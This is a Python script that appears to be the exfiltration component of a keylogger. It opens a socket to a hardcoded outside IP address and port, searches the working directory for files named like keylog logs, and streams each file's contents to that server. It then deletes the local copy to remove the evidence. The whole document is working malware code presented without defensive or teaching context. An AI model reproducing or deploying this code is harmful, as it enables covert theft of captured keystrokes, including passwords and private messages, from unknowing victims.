import socket
import os
import re
import urllib.request

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step
# the ip address or hostname of the server, the receiver
host = '76.88.27.225'
# the port, let's use 5001
port = 5001
#regex pattern searching
rootdir = os.getcwd()
pattern = re.compile("^keylog-\d{4}-\d{2}-\d{2}-\d{6}_\d{4}-\d{2}-\d{2}-\d{6}\.txt$")

# create the client socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
print(f"[+] Connecting to {host}:{port}")
s.connect((host, port))
print("[+] Connected.\n")

while True:   
    for root, dirs, files in os.walk(rootdir):
        for file in files:
            if pattern.match(file):
                # the name of file we want to send, make sure it exists
                print("Found matching filename\n")
                filename = file
                break
        else:
            print("closing client socket\n")
            s.close()
            print("exiting client.py code\n")
            exit()
        
        break                     

    # get the file size
    filesize = os.path.getsize(filename)
    print("Filesize: ", filesize, "\n")
    # send the filename and filesize
    s.send(f"{filename}{SEPARATOR}{filesize}\n".encode())
    print("sent the filename: ", filename, " of filesize: ", filesize, "\n")
    # start sending the file
    #progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            print("read into file: ", bytes_read, "\n")
            if not bytes_read:
                print("0 bytes detected, closing file\n")
                # file transmitting is done
                f.close()
                print("file closed\n")
                os.remove(filename)
                print("file removed\n")
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.send(bytes_read)
            print("sent ", bytes_read, " bytes.\n")
            # update the progress bar
            #progress.update(len(bytes_read))